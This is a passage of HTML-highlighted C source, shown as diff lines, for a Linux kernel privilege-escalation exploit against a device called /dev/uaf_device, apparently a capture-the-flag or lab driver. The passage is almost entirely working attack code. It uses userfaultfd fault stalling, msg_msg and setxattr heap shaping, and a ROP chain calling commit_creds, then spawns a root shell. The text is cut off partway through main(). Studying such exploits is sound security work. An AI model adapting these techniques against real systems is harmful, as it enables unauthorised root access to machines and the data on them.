+</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] status has been saved.</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">typedef struct 
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">long</span><span style="color:#c0c5ce;"> mtype;
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> mtext[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">}msg;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">typedef struct 
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*ll_next;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*ll_prev;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">long</span><span style="color:#c0c5ce;"> m_type;
+</span><span style="color:#c0c5ce;">    size_t m_ts;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*next;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*security;
+</span><span style="color:#c0c5ce;">}msg_header;
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">get_msg_queue</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">msgget</span><span style="color:#c0c5ce;">(IPC_PRIVATE, </span><span style="color:#d08770;">0666 </span><span style="color:#c0c5ce;">| IPC_CREAT);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">getshell</span><span style="color:#c0c5ce;">(){
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(!</span><span style="color:#8fa1b3;">getuid</span><span style="color:#c0c5ce;">()){
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Root now</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">not root yet</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">bind_core</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">core</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">  cpu_set_t cpu_set;
+</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">CPU_ZERO</span><span style="color:#c0c5ce;">(&amp;cpu_set);
+</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">CPU_SET</span><span style="color:#c0c5ce;">(core, &amp;cpu_set);
+</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">sched_setaffinity</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">getpid</span><span style="color:#c0c5ce;">(), sizeof(cpu_set), &amp;cpu_set);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">register_userfault</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">fault_page</span><span style="color:#c0c5ce;">,</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">handler</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">	pthread_t thr;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffdio_api ua;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffdio_register ur;
+</span><span style="color:#c0c5ce;">	uint64_t uffd = </span><span style="color:#8fa1b3;">syscall</span><span style="color:#c0c5ce;">(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+</span><span style="color:#c0c5ce;">	ua.</span><span style="color:#bf616a;">api </span><span style="color:#c0c5ce;">= UFFD_API;
+</span><span style="color:#c0c5ce;">	ua.</span><span style="color:#bf616a;">features </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(uffd, UFFDIO_API, &amp;ua) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">ErrExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] ioctl-UFFDIO_API error</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	ur.</span><span style="color:#bf616a;">range</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">start </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)fault_page; </span><span style="color:#65737e;">// the area we want to monitor
+</span><span style="color:#c0c5ce;">	ur.</span><span style="color:#bf616a;">range</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">len </span><span style="color:#c0c5ce;">= PAGE_SIZE;
+</span><span style="color:#c0c5ce;">	ur.</span><span style="color:#bf616a;">mode </span><span style="color:#c0c5ce;">= UFFDIO_REGISTER_MODE_MISSING;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(uffd, UFFDIO_REGISTER, &amp;ur) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;">// register missing page error handling. when a missing page occurs, the program will block. at this time, we will operate in another thread
+</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">ErrExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] ioctl-UFFDIO_REGISTER error</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// open a thread, receive the wrong signal, and the handle it
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> s = </span><span style="color:#8fa1b3;">pthread_create</span><span style="color:#c0c5ce;">(&amp;thr, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, handler, (</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)uffd);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(s!=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">ErrExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] pthread-create error</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">userfault_hijack_handler</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffd_msg msg;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> uffd = (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)arg;
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> pollfd pollfd;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> nready;
+</span><span style="color:#c0c5ce;">	pollfd.</span><span style="color:#bf616a;">fd </span><span style="color:#c0c5ce;">= uffd;
+</span><span style="color:#c0c5ce;">	pollfd.</span><span style="color:#bf616a;">events </span><span style="color:#c0c5ce;">= POLLIN;
+</span><span style="color:#c0c5ce;">	nready = </span><span style="color:#8fa1b3;">poll</span><span style="color:#c0c5ce;">(&amp;pollfd, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(nready != </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">ErrExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] wrong poll return value</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	nready = </span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">(uffd, &amp;msg, sizeof(msg));
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(nready&lt;=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">ErrExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] msg error</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*page = (</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)</span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(page == MAP_FAILED)
+</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">ErrExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] mmap error</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffdio_copy uc;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] hijack handler created</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] tigger..</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	prdi_r += vmbase;
+</span><span style="color:#c0c5ce;">	prbx_r += vmbase;
+</span><span style="color:#c0c5ce;">  init_cred += vmbase;
+</span><span style="color:#c0c5ce;">	prepare_kernel_cred += vmbase;
+</span><span style="color:#c0c5ce;">	commit_creds += vmbase;
+</span><span style="color:#c0c5ce;">	swapgs_restore_regs_and_return_to_usermode += vmbase;
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> tmp_buf[</span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// fix corrupted freelist
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">10</span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">; i++)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(fd_stat[i]);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> target_fd = fd_stat[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">__asm__</span><span style="color:#c0c5ce;">(
+</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">mov r15,   0xbeefdead;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">mov r14,   0x11111111;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">mov r13,   0x22222222;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">mov r12,   prdi_r;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">mov rbp,   init_cred;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">mov rbx,   prbx_r;</span><span style="color:#c0c5ce;">&quot;    
+</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">mov r11,   0x99999999;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">mov r10,   commit_creds;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">mov r9,    swapgs_restore_regs_and_return_to_usermode;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">mov r8,    0;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">xor rax,   rax;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">mov rcx,   0xaaaaaaaa;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">mov rdx,   8;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">mov rsi,   rsp;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">  &quot;</span><span style="color:#a3be8c;">mov rdi,   [fd_stat+4*2];</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">syscall</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">	);
+</span><span style="color:#c0c5ce;">  
+</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">getshell</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">        
+</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// init page
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(page, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(page));
+</span><span style="color:#c0c5ce;">	uc.</span><span style="color:#bf616a;">src </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)page;
+</span><span style="color:#c0c5ce;">	uc.</span><span style="color:#bf616a;">dst </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)msg.</span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">pagefault</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">address </span><span style="color:#c0c5ce;">&amp; ~(PAGE_SIZE - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	uc.</span><span style="color:#bf616a;">len </span><span style="color:#c0c5ce;">= PAGE_SIZE;
+</span><span style="color:#c0c5ce;">	uc.</span><span style="color:#bf616a;">mode </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	uc.</span><span style="color:#bf616a;">copy </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(uffd, UFFDIO_COPY, &amp;uc);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] hijack handler done</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">userfault_setzero_handler</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffd_msg msg;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> uffd = (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)arg;
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> pollfd pollfd;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> nready;
+</span><span style="color:#c0c5ce;">	pollfd.</span><span style="color:#bf616a;">fd </span><span style="color:#c0c5ce;">= uffd;
+</span><span style="color:#c0c5ce;">	pollfd.</span><span style="color:#bf616a;">events </span><span style="color:#c0c5ce;">= POLLIN;
+</span><span style="color:#c0c5ce;">	nready = </span><span style="color:#8fa1b3;">poll</span><span style="color:#c0c5ce;">(&amp;pollfd, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(nready != </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">ErrExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] wrong poll return value</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	nready = </span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">(uffd, &amp;msg, sizeof(msg));
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(nready&lt;=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">ErrExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] msg error</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*page = (</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)</span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(page == MAP_FAILED)
+</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">ErrExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] mmap error</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffdio_copy uc;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> my_idx = release_cnt;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] setzero handler </span><span style="color:#d08770;">%ld</span><span style="color:#a3be8c;"> created</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, release_cnt++);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">while</span><span style="color:#c0c5ce;">(my_idx==</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(release_cnt==</span><span style="color:#d08770;">3 </span><span style="color:#c0c5ce;">&amp;&amp; setxa_can_release==</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">      </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] setzero handler </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> out</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, my_idx);
+</span><span style="color:#c0c5ce;">      </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">while</span><span style="color:#c0c5ce;">(my_idx==</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">    msg_can_release=</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(release_cnt==</span><span style="color:#d08770;">2 </span><span style="color:#c0c5ce;">&amp;&amp; setxa_can_release==</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">      release_cnt++;
+</span><span style="color:#c0c5ce;">      </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] setzero handler </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> out</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, my_idx);
+</span><span style="color:#c0c5ce;">      </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// init page
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(page, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(page));
+</span><span style="color:#c0c5ce;">	uc.</span><span style="color:#bf616a;">src </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)page;
+</span><span style="color:#c0c5ce;">	uc.</span><span style="color:#bf616a;">dst </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)msg.</span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">pagefault</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">address </span><span style="color:#c0c5ce;">&amp; ~(PAGE_SIZE - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	uc.</span><span style="color:#bf616a;">len </span><span style="color:#c0c5ce;">= PAGE_SIZE;
+</span><span style="color:#c0c5ce;">	uc.</span><span style="color:#bf616a;">mode </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	uc.</span><span style="color:#bf616a;">copy </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(uffd, UFFDIO_COPY, &amp;uc);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] setzero handler done</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">setxattr_handler</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">* addr = (</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)arg;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">setxattr</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/exp</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">ay</span><span style="color:#c0c5ce;">&quot;, addr+ PAGE_SIZE - </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">bind_core</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">save_status</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/uaf_device</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(fd&lt;</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">	  </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">open</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buf[</span><span style="color:#d08770;">0x500</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(buf, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x500</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> leak_qid[</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">], pipe_fd[</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">][</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> msg_buf[</span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*hack_buf[</span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">	msg *message = (msg *)msg_buf;
